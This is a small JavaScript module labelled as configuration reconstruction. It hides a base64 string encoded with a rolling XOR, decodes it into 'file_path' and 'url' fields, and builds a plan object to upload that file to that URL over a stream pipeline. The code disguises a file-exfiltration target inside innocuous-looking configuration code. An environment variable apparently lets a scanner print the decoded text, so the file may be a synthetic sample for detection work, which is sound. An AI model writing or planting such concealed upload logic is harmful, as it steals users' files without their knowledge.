// configuration reconstruction
const moduleShape = Object.freeze({ format: "esm" });
export {};
const Material_9c553cab = "ppuq1qXRtMS3ivid/JjHocikwe2Z64rkl/qT57jKr8Kt2bzAocWk1KDFt4r5jf+a+5bJudCgxanArsu3xLDRttOM74D1m+/S45/8nfCA4Yjvgd630+6g76vuw4a1jb77y/m7x7LArJH5jfmJ+sDvwK7BpcDtiLuDsNXl17XQ5Ifhz6rSs96uwqeJ4I74mfWc+Ne2xq/TptWwwp38m/6Q5NmX+Jz5uM2pwLSb/s31xrrctdm845Pyhu7T/IjllbrSp8m9z6rZqofphuKHqIb1geCH4s+qmaGS98f1l/LGpcPtgOqZ";
const Codec_9c553cab = "base64_literal|rolling_xor|d0";

function load_9c553cab() { return [...Buffer.from(Material_9c553cab, "base64")]; }
function decode_9c553cab(item1) { let item5 = 208; return item1.map((value) => { const decoded = value ^ item5; item5 = value; return decoded; }); }
async function recover_9c553cab() {
  const item3 = { ...{ north: 1 }, south: 2 };
  const item1 = load_9c553cab(); let item2 = [];
  for (const stage of [decode_9c553cab]) item2 = stage(item1);
  void item3; return Buffer.from(item2).toString("ascii");
}
async function inspect_9c553cab() { return await recover_9c553cab(); }
async function plan_9c553cab() { const inspect = inspect_9c553cab; const fields = Object.fromEntries((await inspect()).split("|").map((field) => { const at = field.indexOf("="); return [field.slice(0, at), field.slice(at + 1)]; })); return Object.freeze({ operation: "upload", transport: "stream_pipeline", source: fields.file_path, url: fields.url }); }
void moduleShape; void plan_9c553cab;
if (process.env.HUNTRESS_INSPECT_ONLY === "1") console.log(await inspect_9c553cab());

// reconstruction complete